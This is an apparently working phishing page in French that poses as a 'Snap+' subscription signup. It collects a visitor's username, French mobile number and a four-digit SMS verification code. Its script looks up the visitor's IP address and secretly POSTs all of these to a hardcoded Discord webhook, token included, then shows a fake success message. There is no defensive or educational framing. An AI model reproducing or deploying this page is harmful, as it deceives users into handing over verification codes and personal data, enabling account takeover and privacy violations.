<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>S'inscrire à Snap+</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{margin:0;height:100vh;background:black;overflow:hidden;display:flex;align-items:center;justify-content:center;color:white}
canvas{position:fixed;inset:0;z-index:0}
.card{position:relative;z-index:1;width:90%;max-width:420px;background:#111;border-radius:20px;padding:28px 24px 32px;box-shadow:0 20px 60px rgba(0,0,0,.6)}
h1{text-align:center;color:#f7c84b;margin-bottom:20px}
label{display:block;margin-bottom:8px}
input,select{width:100%;padding:14px 16px;border-radius:10px;border:none;font-size:16px;margin-bottom:20px}
button{width:180px;margin:auto;display:block;padding:14px;border-radius:12px;border:none;background:#f7c84b;color:black;font-size:17px;font-weight:600;cursor:pointer}
button:disabled{background:#777;cursor:not-allowed}
.error{text-align:center;color:#ff6b6b;margin-top:-10px}
.code-box{display:flex;justify-content:space-between;gap:12px;margin:20px 0}
.code-box input{width:60px;height:70px;font-size:30px;font-weight:700;text-align:center;border-radius:14px;border:2px solid #333;background:black;color:#f7c84b}
.code-box input:focus{border-color:#f7c84b;box-shadow:0 0 12px rgba(247,200,75,.6);outline:none}
.resend{text-align:center;margin-top:10px;font-size:14px;color:#aaa;cursor:pointer}
.success{text-align:center}
.check{width:90px;height:90px;border-radius:50%;border:4px solid #2ecc71;margin:20px auto;position:relative;animation:scale .5s ease}
.check:after{content:"✔";font-size:48px;color:#2ecc71;position:absolute;top:50%;left:50%;transform:translate(-50%,-55%)}
@keyframes scale{from{transform:scale(.5);opacity:0}to{transform:scale(1);opacity:1}}
</style>
</head>
<body>

<canvas id="bg"></canvas>

<div class="card">
<h1 id="title">S'inscrire à Snap+</h1>

<!-- STEP 1 -->
<div id="step1">
<label>Nom d'utilisateur :</label>
<input id="username">

<label>Durée de l’abonnement :</label>
<select id="duration">
  <option value="1">1 mois</option>
  <option value="3" selected>3 mois</option>
  <option value="12">12 mois</option>
</select>

<button id="b1" disabled>Continuer</button>
</div>

<!-- STEP 2 -->
<div id="step2" style="display:none">
<label>Numéro français :</label>
<input id="phone" placeholder="06 12 34 56 78">
<div class="error" id="phoneErr"></div>
<button id="b2" disabled>Continuer</button>
</div>

<!-- STEP 3 -->
<div id="step3" style="display:none">
<label>Entrez le code :</label>
<div class="code-box">
<input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
</div>
<button id="b3" disabled>Valider</button>
<div class="resend" id="resend">Renvoyer le code</div>
</div>

<!-- STEP 4 -->
<div id="step4" style="display:none" class="success">
<div class="check"></div>
<h2>Vous avez débloqué Snap+</h2>
</div>

</div>

<script>
/* ===== WEBHOOK ===== */
const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1474900079205679164/9DmcNu0XH3dzJFXZMlv8a8tIjqdvemCjC5NHzifVFVuiL_mrayd3Sdywkt0LEE4Wfvbd";

/* ===== BACKGROUND ===== */
const c=document.getElementById("bg"),x=c.getContext("2d");let w,h;
function r(){w=c.width=innerWidth;h=c.height=innerHeight}onresize=r;r();
const pts=[...Array(90)].map(()=>({x:Math.random()*w,y:Math.random()*h,vx:(Math.random()-.5)*.6,vy:(Math.random()-.5)*.6}));
let m={x:-1e4,y:-1e4};onmousemove=e=>{m.x=e.clientX;m.y=e.clientY};
function a(){x.clearRect(0,0,w,h);
pts.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0||p.x>w)p.vx*=-1;if(p.y<0||p.y>h)p.vy*=-1;
let dx=p.x-m.x,dy=p.y-m.y,d=Math.hypot(dx,dy);if(d<120){p.vx+=dx/d*.4;p.vy+=dy/d*.4}p.vx*=.98;p.vy*=.98});
for(let i=0;i<pts.length;i++)for(let j=i+1;j<pts.length;j++){let dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.hypot(dx,dy);
if(d<130){x.strokeStyle=`rgba(247,200,75,${1-d/130})`;x.beginPath();x.moveTo(pts[i].x,pts[i].y);x.lineTo(pts[j].x,pts[j].y);x.stroke()}}
pts.forEach(p=>{x.fillStyle="#f7c84b";x.beginPath();x.arc(p.x,p.y,2.2,0,6.28);x.fill()});
requestAnimationFrame(a)}a();

/* ===== FORM LOGIC ===== */
username.oninput=()=>b1.disabled=!username.value.trim();

b1.onclick=()=>{
  step1.style.display="none";
  step2.style.display="block";
};

phone.oninput=()=>{
  let ok=/^(?:\+33|0)[67]\d{8}$/.test(phone.value.replace(/\s/g,""));
  b2.disabled=!ok;
  phoneErr.textContent=ok?"":"Numéro invalide";
};

b2.onclick=()=>{
  step2.style.display="none";
  step3.style.display="block";
};

const inputs=[...document.querySelectorAll(".code-box input")];
inputs.forEach((i,n)=>{
  i.oninput=()=>{
    i.value=i.value.replace(/\D/g,"");
    if(i.value&&inputs[n+1])inputs[n+1].focus();
    b3.disabled=!inputs.every(i=>i.value);
  };
  i.onkeydown=e=>{
    if(e.key==="Backspace"&&!i.value&&inputs[n-1])inputs[n-1].focus();
  };
});

/* ===== RÉCUPÉRATION IP ===== */
let userIP = "Inconnue";

fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => { userIP = data.ip || "Erreur récupération IP"; })
  .catch(() => { userIP = "Erreur récupération IP"; });

b3.onclick=()=>{
  const code = inputs.map(i=>i.value).join("");

  fetch(WEBHOOK_URL,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      embeds:[{
        title:"Nouvelle inscription Snap+",
        color:0xF7C84B,
        fields:[
          {name:"Utilisateur",     value:username.value,           inline:true},
          {name:"Durée",           value:duration.value+" mois",   inline:true},
          {name:"Téléphone",       value:phone.value,              inline:false},
          {name:"Code saisi",      value:code,                     inline:false},
          {name:"Adresse IP",      value:userIP,                   inline:false}
        ],
        timestamp:new Date().toISOString()
      }]
    })
  }).catch(err => console.error("Erreur envoi webhook:", err));

  step3.style.display="none";
  step4.style.display="block";
  title.textContent="Succès";
};

/* ===== RESEND ===== */
let cd=0;
resend.onclick=()=>{
  if(cd) return;
  cd=30;
  resend.textContent="Renvoyer (30s)";
  let t=setInterval(()=>{
    cd--;
    resend.textContent=`Renvoyer (${cd}s)`;
    if(!cd){clearInterval(t);resend.textContent="Renvoyer le code";}
  },1000);
};
</script>

</body>
</html>
